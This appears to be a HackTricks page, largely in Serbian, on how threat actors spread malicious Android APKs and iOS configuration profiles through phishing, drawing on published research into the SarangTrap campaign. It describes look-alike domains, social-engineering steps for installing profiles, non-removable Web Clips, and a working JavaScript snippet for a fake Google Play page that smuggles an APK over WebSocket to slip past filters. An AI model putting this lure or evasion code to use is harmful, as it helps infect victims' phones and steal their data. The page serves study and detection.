# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> Ova stranica obuhvata tehnike koje threat actors koriste za distribuciju **malicious Android APKs** i **iOS mobile-configuration profiles** putem phishinga (SEO, social engineering, fake stores, dating apps itd.).
> Materijal je prilagođen na osnovu SarangTrap campaign koju je 2025. godine razotkrio Zimperium zLabs, kao i drugih javno dostupnih istraživanja.<sup>[[1]](#references)</sup>

## Tok napada

1. **SEO/Phishing Infrastructure**
* Registrovati desetine look-alike domena (dating, cloud share, car service…).
– Koristiti keywords na lokalnom jeziku i emojis u `<title>` elementu radi boljeg rangiranja na Google-u.
– Hostovati i Android (`.apk`) i iOS install instructions na istoj landing page stranici.
2. **First Stage Download**
* Android: direktan link ka *unsigned* APK-u ili APK-u sa “third-party store” izvora.
* iOS: `itms-services://` ili običan HTTPS link ka malicious **mobileconfig** profilu (pogledajte u nastavku).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection i drugo post-install malware ponašanje obrađeni su na posebnoj Android Malware Post-Exploitation stranici u nastavku.
4. **iOS Delivery Technique**
* Jedan **mobile-configuration profile** može zahtevati `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. radi upisivanja uređaja u “MDM”-like supervision.
* Social-engineering instructions:
1. Otvoriti Settings ➜ *Profile downloaded*.
2. Tapnuti *Install* tri puta (screenshots na phishing stranici).
3. Trust-ovati unsigned profile ➜ attacker dobija *Contacts* & *Photo* entitlement bez App Store review-a.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads mogu **pinovati phishing URL na Home Screen** pomoću branded icon/label.
* Web Clips mogu da rade **full-screen** (sakrivaju browser UI) i mogu biti označeni kao **non-removable**, čime se žrtva primorava da obriše profile kako bi uklonila ikonu.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Plain HTTP, često na portu 80 sa HOST header-om kao što je `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako se uočava).

## Android Malware Post-Exploitation

Za Android malware tradecraft nakon instalacije, kao što su C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS i persistence, pogledajte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers sve češće zamenjuju statične APK linkove Socket.IO/WebSocket kanalom ugrađenim u lures koji izgledaju kao Google Play stranice. Na ovaj način se URL payload-a skriva, zaobilaze se URL/extension filters i zadržava se realističan install UX.<sup>[[2]](#references)[[4]](#references)</sup>

Tipičan client flow uočen u praksi:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Zašto zaobilazi jednostavne kontrole:
- Nijedan statički APK URL nije izložen; payload se rekonstruiše u memoriji iz WebSocket frame-ova.
- URL/MIME/extension filteri koji blokiraju direktne `.apk` odgovore mogu propustiti binarne podatke tunelovane putem WebSockets/Socket.IO.
- Crawleri i URL sandbox-ovi koji ne izvršavaju WebSockets neće preuzeti payload.

Pogledajte takođe WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Mračna strana romantike: SarangTrap extortion campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Podešavanja Web Clips payload-a za Apple uređaje](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan usmeren na korisnike Android-a u Indoneziji i Vijetnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
